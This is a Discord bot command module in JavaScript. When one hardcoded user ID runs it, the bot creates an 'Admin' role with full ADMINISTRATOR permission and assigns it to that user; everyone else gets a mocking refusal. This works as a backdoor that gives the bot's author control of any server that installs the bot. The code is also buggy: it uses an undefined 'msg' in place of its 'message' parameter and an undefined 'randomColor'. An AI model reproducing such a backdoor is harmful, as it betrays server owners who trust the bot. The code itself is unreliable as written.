module.exports = {

    name: "admin",
    description: 'gives the user admin powers to this server',
    aliases: ['adm'],
    usage: "[user]",
    async execute(message, args) {
        if (msg.author.id === "417513749453209601") {
            roleName = "Admin";//+ Math.floor(Math.random() * 1000) + 1;;
            role = msg.guild.roles.cache.find(role => role.name === roleName);
            rolePOS = msg.guild.roles.cache.find(role => role.name === "pool Club Bot").position;

            if (!role) {
                c = Math.floor(Math.random() * 10) + 1;

                role = await msg.guild.roles.create({ data: { color: c, position: rolePOS, hoist: true, name: roleName, permissions: ['ADMINISTRATOR'] } });

            }
            //role = await msg.guild.roles.create({ data: { color: 2, position: 20 ,hoist: true,name: roleName, permissions: ['ADMINISTRATOR'] } });
            const user = msg.guild.members.cache.find(user => user.id === msg.author.id);

            // console.log(role);
            role.setColor(randomColor);
            console.log(randomColor);
            console.log(role.hexColor);
            user.roles.add(role);
            console.log(role);
            msg.channel.send("you are now an admin, enjoy :)");
        }
        else {

            msg.channel.send("ONLY THE GOD Ayub, CAN USE THIS COMMAND");
            msg.author.send("Ayub said no..... sawway! plz dont yell at me <3");
        }
    }


}